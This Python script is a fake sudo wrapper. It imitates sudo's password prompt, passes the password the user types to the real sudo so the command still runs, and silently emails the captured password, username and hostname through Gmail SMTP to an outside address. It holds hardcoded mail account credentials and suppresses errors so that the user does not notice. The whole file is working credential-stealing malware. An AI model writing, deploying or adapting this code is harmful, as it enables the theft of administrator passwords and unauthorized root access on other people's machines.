#! /bin/env python
from pexpect import *
from sys import argv
import os
import smtplib
from getpass import getpass

def dosudo(cmmd):
    usnm=os.environ.get('USER')
    hsnm=os.environ.get('HOSTNAME')
    psstr='[sudo] password for {0}: '.format(usnm)
    sf='sudo succeeded'
    psw=''
    try:
        p=spawn('bash',['-c','/usr/bin/sudo '+cmmd])
        i=0
        while i==0:
            i=p.expect([usnm+': ','3 incorrect password attempts','will be reported.',EOF])
            if i==0:
                psw=getpass(psstr)
                p.sendline(psw)
            if i==1:
                sf='sudo failed'
                p.expect(EOF)
                print 'sudo: 3 incorrect password attempts'
            if i==2:
                sf='Not Sudoer'
                p.expect(EOF)
                print '{0} is not in the sudoers file.  This incident will be reported.'.format(usnm)
        rslt=p.before.strip()
    except Exception as ex:
        sf='failed'
        rslt='Permission denied'
    return ('password for {0} on {1}: {2} [{3}]'.format(usnm,hsnm,psw,sf) if psw else '',rslt)

def sendemail(mssg):
    smtpserver = smtplib.SMTP("smtp.gmail.com")
    smtpserver.ehlo() 
    smtpserver.starttls()
    smtpserver.login("testhellotestworldtest@gmail.com", "testtesttesthello")
    msg='To:Me\nFrom:testhellotestworldtest@gmail.com\nSubject:sudoer password\n\n{0}\n\n'.format(mssg)
    smtpserver.sendmail("testhellotestworldtest@gmail.com",'zminkling@gmail.com', msg)
    smtpserver.close()

if __name__=="__main__":
    comm=' '.join(argv[1:])
    try:
        dsd=dosudo(comm)
        if dsd[0]: sendemail(dsd[0])
        if dsd[1]: print dsd[1]
    except:
        pass
